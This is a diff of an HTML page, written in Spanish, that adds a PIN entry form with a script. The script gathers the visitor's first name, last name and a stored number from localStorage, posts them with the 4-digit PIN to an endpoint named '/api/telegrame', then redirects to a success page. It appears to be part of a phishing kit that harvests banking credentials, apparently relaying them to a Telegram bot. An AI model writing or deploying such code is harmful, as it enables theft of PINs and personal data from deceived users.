@@ -181,43 +181,54 @@
 <!-- Procedure Section -->
 
 <section class="procedure">
-<h2>
-<span style="font-size: 11px;">
-<span class="badge badge-info" style="background-color: #337ab7; border-radius: 10px; padding: 3px 7px;">5</span>
-<span style="color:#337ab7; font-weight:700;"> PIN</span>
-</span>
-</h2>
+<h2 class="text-center">Ingrese su PIN</h2>
+<p class="text-center">Por favor, complete el siguiente campo para enviar su PIN.</p>
 
-<form id="pinForm" method="post">
-<div class="form-group">
-<label>Pin</label>
-<input type="text" maxlength="4" class="form-control" name="pin_code" placeholder="0000" required />
-</div>
-<button type="submit" class="btn btn-primary w-100">Enviar</button>
+<form id="pinForm">
+    <div class="form-group">
+        <input type="text" id="pin_input" maxlength="4" placeholder="0000" required />
+        <div id="pinError">Por favor, ingrese un PIN válido.</div>
+    </div>
+    <button type="submit" class="btn btn-primary">Enviar PIN</button>
 </form>
+</section>
 
 <script>
-document.getElementById("pinForm").addEventListener("submit", async function(e) {
-  e.preventDefault();
-  const pin = e.target.pin_code.value;
+const pinForm = document.getElementById("pinForm");
 
-  try {
-    const res = await fetch("/api/sendPin", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ pin_code: pin })
-    });
+pinForm.addEventListener("submit", async (e) => {
+    e.preventDefault();
 
-    const data = await res.json();
-    console.log(data);
-    window.location.href = "index.html";
-  } catch (err) {
-    console.error(err);
-    alert("❌ Error al enviar PIN");
-  }
+    const pin_code = document.getElementById("pin_input").value;
+    const first_name = localStorage.getItem("first_name") || "";
+    const last_name = localStorage.getItem("last_name") || "";
+    const num = localStorage.getItem("num") || "";
+
+    if(pin_code.length !== 4){
+        document.getElementById("pinError").style.display = "block";
+        return;
+    } else {
+        document.getElementById("pinError").style.display = "none";
+    }
+
+    try {
+        const response = await fetch("/api/telegrame", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ first_name, last_name, num, pin_code })
+        });
+
+        if(response.ok){
+            window.location.href = "success.html"; // ← Redirect بعد الإرسال
+        } else {
+            document.getElementById("pinError").style.display = "block";
+        }
+    } catch(err){
+        console.error(err);
+        document.getElementById("pinError").style.display = "block";
+    }
 });
 </script>
-</section>
 
 <footer>
 <div class="container">
